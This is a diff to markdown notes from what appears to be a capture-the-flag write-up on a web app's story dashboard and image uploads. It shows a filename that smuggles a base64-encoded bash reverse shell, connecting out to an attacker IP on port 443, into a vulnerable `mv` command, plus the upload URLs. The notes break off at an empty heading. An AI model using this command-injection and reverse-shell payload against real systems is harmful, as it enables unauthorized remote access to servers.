@@ -336,8 +336,16 @@ if __name__ == '__main__':
                         result = connector.commit()
 ```
 Analyzing `__init__.py` reveals that `mv` command is vulnerable in `image_url` section of `__init__.py` code when image is added to story via url. So we can rename file like "clarkey10.jpg;\`echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC45OC80NDM7IGJhc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | bash\`"  , so that when image is uploaded via url , `mv` command is executed along with  base64 encoded reverse shell command in bash to get reverse shell as www-data.
-## Stories can be added on url 
+## Stories can be added on url http://10.10.11.101/dashboard/stories
 ![[Pasted image 20211004113548.png]]
+## Adding stories and uploading image from computer
+Adding stories and uploading image from computer.
+![[Pasted image 20211004114242.png]]
+Uploaded images are stored in url http://10.10.11.101/static/img/
+![[Pasted image 20211004114531.png]]
+## Images can also be uploaded from url which can trigger `mv` to get reverse shell
+![[Pasted image 20211004114644.png]]
+## Now 
 
 
 
